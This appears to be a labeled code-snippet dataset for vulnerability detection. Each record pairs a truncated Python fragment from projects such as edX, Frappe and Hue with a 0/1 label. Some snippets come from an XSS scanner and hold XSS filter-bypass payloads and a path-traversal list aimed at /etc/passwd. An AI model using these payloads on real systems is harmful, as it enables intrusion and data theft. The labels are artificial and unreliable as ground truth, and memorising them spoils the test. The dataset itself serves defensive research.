0}, {"snippet_id": 48825, "code": ") elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field", "label": 0}, {"snippet_id": 41072, "code": "\t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description", "label": 0}, {"snippet_id": 850, "code": "().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact", "label": 1}, {"snippet_id": 47218, "code": "{str(item.name): item for item in admin.menu()} assert 'Records' in menu_items assert menu_items['Records'].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children", "label": 0}, {"snippet_id": 2369, "code": " except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}", "label": 0}, {"snippet_id": 15234, "code": "-assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore", "label": 0}, {"snippet_id": 6176, "code": "(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer). EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number of threads", "label": 0}, {"snippet_id": 51145, "code": " return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return date class", "label": 0}, {"snippet_id": 6855, "code": " phase. After this time, login cannot complete because the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self.config.getint(self.section, 'login_state_ttl'", "label": 0}, {"snippet_id": 46588, "code": " } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')", "label": 0}, {"snippet_id": 4893, "code": "\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas", "label": 1}, {"snippet_id": 22471, "code": "'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r", "label": 0}, {"snippet_id": 13943, "code": "]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 19462, "code": "}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 36453, "code": "\tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !", "label": 0}, {"snippet_id": 54863, "code": ".helper import bulk_update from django.contrib.auth.decorators import login_required from django.db import transaction from django.http import( HttpResponseBadRequest, HttpResponseForbidden, JsonResponse,", "label": 0}, {"snippet_id": 29135, "code": "*kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos", "label": 0}, {"snippet_id": 42947, "code": "\t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype", "label": 0}, {"snippet_id": 16662, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r", "label": 0}, {"snippet_id": 23600, "code": "=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'", "label": 0}, {"snippet_id": 52406, "code": " workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance", "label": 0}, {"snippet_id": 47067, "code": " RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter=FilterConverter() can_create=False can_edit=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated'", "label": 0}, {"snippet_id": 47361, "code": " import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is", "label": 0}, {"snippet_id": 22199, "code": ".views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 39840, "code": "\t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype", "label": 0}, {"snippet_id": 36079, "code": "=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default)", "label": 0}, {"snippet_id": 36477, "code": " in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\"", "label": 0}, {"snippet_id": 15007, "code": " setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command", "label": 0}, {"snippet_id": 44655, "code": "'node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response", "label": 0}, {"snippet_id": 32014, "code": " criteria, attributes) \t\tresults=[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]') \t\texcept: \t\t\tprint('error", "label": 0}, {"snippet_id": 18041, "code": "'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki", "label": 0}, {"snippet_id": 17948, "code": ", 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$", "label": 0}, {"snippet_id": 26568, "code": "../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e", "label": 0}, {"snippet_id": 27606, "code": "'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url': make_logout_url(dest_url=self.request.url), 'contact_string': contact_string, } self.render(", "label": 0}, {"snippet_id": 16183, "code": " name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student", "label": 0}, {"snippet_id": 561, "code": "]: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result", "label": 1}, {"snippet_id": 39281, "code": "[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database", "label": 0}, {"snippet_id": 27538, "code": " _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass", "label": 0}, {"snippet_id": 40560, "code": " fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val", "label": 0}, {"snippet_id": 12976, "code": ".run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name", "label": 0}, {"snippet_id": 10013, "code": " Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( ", "label": 1}, {"snippet_id": 31831, "code": ", \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' %", "label": 0}, {"snippet_id": 42052, "code": "\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t", "label": 0}, {"snippet_id": 14012, "code": "[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 13343, "code": ".views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=", "label": 0}, {"snippet_id": 42527, "code": "\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\"", "label": 0}, {"snippet_id": 13707, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 51381, "code": "\" Django settings for dashboard project. Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the", "label": 0}, {"snippet_id": 48729, "code": " response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") if request.GET.get(\"id", "label": 0}, {"snippet_id": 4382, "code": " style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s", "label": 0}, {"snippet_id": 11149, "code": " running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt", "label": 0}, {"snippet_id": 44059, "code": " self.using=using self.index=index self.doc_types=doc_types self._model=model if fields: self.fields=fields super(RTDFacetedSearch, self).__init__(**kwargs) class ProjectSearch(RTDFacetedSearch): fields", "label": 0}, {"snippet_id": 32593, "code": "'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg", "label": 0}, {"snippet_id": 52180, "code": ") def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get", "label": 0}, {"snippet_id": 3213, "code": " dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update", "label": 0}, {"snippet_id": 19217, "code": ".env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo", "label": 0}, {"snippet_id": 23588, "code": ": urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\")", "label": 0}, {"snippet_id": 54597, "code": ".form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article", "label": 0}, {"snippet_id": 15508, "code": " for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure", "label": 0}, {"snippet_id": 52704, "code": "\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0", "label": 0}, {"snippet_id": 51680, "code": "'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] LANGUAGE_CODE='en-us' TIME_ZONE='UTC' USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME", "label": 0}, {"snippet_id": 31885, "code": "') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t \t\telse: \t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list", "label": 0}, {"snippet_id": 48819, "code": ".model_field: return self.model_field.verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as", "label": 0}, {"snippet_id": 3023, "code": ": xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method", "label": 0}, {"snippet_id": 11737, "code": " name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 3106, "code": "-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload", "label": 0}, {"snippet_id": 3434, "code": ", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req", "label": 0}, {"snippet_id": 21, "code": " from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads", "label": 0}, {"snippet_id": 6996, "code": "', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 6240, "code": " logfile. Something like '/var/log/idp/eduid_idp.log' maybe. \"\"\" res=self.config.get(self.section, 'logfile') if not res: res=None return res @property def syslog_socket(self): \"\"\" Syslog socket to log to", "label": 0}, {"snippet_id": 31395, "code": "*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@curr_con\"), \t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"), \t\t\t\t(\"Sessions rate\", \"@sess_rate\") \t\t\t], \t\t\tmode='mouse", "label": 0}, {"snippet_id": 3757, "code": ",scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body", "label": 0}, {"snippet_id": 14262, "code": ", name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ", "label": 0}, {"snippet_id": 48417, "code": "=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\"", "label": 1}, {"snippet_id": 49531, "code": " remote_field=self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj", "label": 0}, {"snippet_id": 22441, "code": "', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"", "label": 0}, {"snippet_id": 28944, "code": "(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output:", "label": 0}, {"snippet_id": 49373, "code": "=field_name self.label=label self.value=value self.query_params=query_params def get_title(self): return self.label def get_url(self): return self.get_url_with_query_params({ self.field_name: self.value ", "label": 0}, {"snippet_id": 186, "code": "(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='", "label": 0}, {"snippet_id": 2489, "code": " decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body=", "label": 0}, {"snippet_id": 43762, "code": "(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t", "label": 0}, {"snippet_id": 49924, "code": " can be found on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program.", "label": 0}, {"snippet_id": 28867, "code": "\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No such file or directory", "label": 0}, {"snippet_id": 6604, "code": " path)) self._parsed_content_packages=res return res @property def verify_request_signatures(self): \"\"\" Verify request signatures, if they exist. This defaults to False since it is a trivial DoS to consume", "label": 0}, {"snippet_id": 53340, "code": " @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([", "label": 0}, {"snippet_id": 50263, "code": "'csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session", "label": 1}, {"snippet_id": 26153, "code": ".instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self", "label": 0}, {"snippet_id": 6865, "code": " \"\"\" return self.config.getint(self.section, 'login_state_ttl') @property def default_scoped_affiliation(self): \"\"\" Add a default eduPersonScopedAffiliation if none is returned from the attribute manager", "label": 0}, {"snippet_id": 3244, "code": "\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload)", "label": 0}, {"snippet_id": 33334, "code": ".add_service(api.BuildsApi()) routes +=prpc_server.get_routes() return routes def get_backend_routes(): prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service", "label": 0}, {"snippet_id": 45848, "code": "'wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping", "label": 0}, {"snippet_id": 16474, "code": ", name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify", "label": 0}, {"snippet_id": 4135, "code": ".parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads", "label": 0}, {"snippet_id": 33603, "code": " has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\",", "label": 0}, {"snippet_id": 29240, "code": "')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept", "label": 0}, {"snippet_id": 12277, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index", "label": 0}, {"snippet_id": 23266, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=", "label": 0}, {"snippet_id": 26100, "code": "=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True self.fields['company'].widget.is_required=True self.fields['company'].widget.attrs['required']='required' del self.fields['company'].widget", "label": 0}, {"snippet_id": 29769, "code": "/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t\treturn_files.add(file) \t\treturn sorted(return_files, reverse=True) \telse:", "label": 0}, {"snippet_id": 7224, "code": "/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if", "label": 0}, {"snippet_id": 1505, "code": "',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content", "label": 0}, {"snippet_id": 30278, "code": "-Language': 'en-US,en;q=0.5', \t\t'Accept-Encoding': 'gzip, deflate' \t} \tq=requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t", "label": 0}, {"snippet_id": 30774, "code": "' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' ' +backend \tfunct.logging(serv, action) if act==\"showCompareConfigs\": \timport glob \tfrom", "label": 0}, {"snippet_id": 47956, "code": " from django.shortcuts import redirect from django.http import HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown", "label": 0}, {"snippet_id": 42261, "code": "\t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse:", "label": 0}, {"snippet_id": 43411, "code": "\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype", "label": 1}, {"snippet_id": 9666, "code": "'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES", "label": 0}, {"snippet_id": 8296, "code": ".MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url", "label": 0}, {"snippet_id": 747, "code": " print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format", "label": 1}, {"snippet_id": 49149, "code": "): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param", "label": 0}, {"snippet_id": 50660, "code": ": Motivation for the disconnect. \"\"\" csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=None csession.save() self.logged_in=False self.client.lineSend(self.csessid,", "label": 0}, {"snippet_id": 28454, "code": "\tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path) \t\t \ttry: \t\tIP=cgi.escape(os.environ[\"REMOTE_ADDR\"]) \t\tcookie=http.cookies.SimpleCookie", "label": 0}, {"snippet_id": 12923, "code": "'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task", "label": 0}, {"snippet_id": 2712, "code": "(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body", "label": 0}, {"snippet_id": 19063, "code": "'ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if", "label": 0}, {"snippet_id": 39426, "code": "=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values())", "label": 0}, {"snippet_id": 10012, "code": "\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement", "label": 1}, {"snippet_id": 13380, "code": ".views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views", "label": 0}, {"snippet_id": 6183, "code": " Number of worker threads to start(integer). EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number of threads should probably be about 2x number of cores to", "label": 0}, {"snippet_id": 8841, "code": "'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP", "label": 0}, {"snippet_id": 28192, "code": "\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s ", "label": 0}, {"snippet_id": 45026, "code": "/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup)", "label": 0}, {"snippet_id": 17283, "code": "): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), 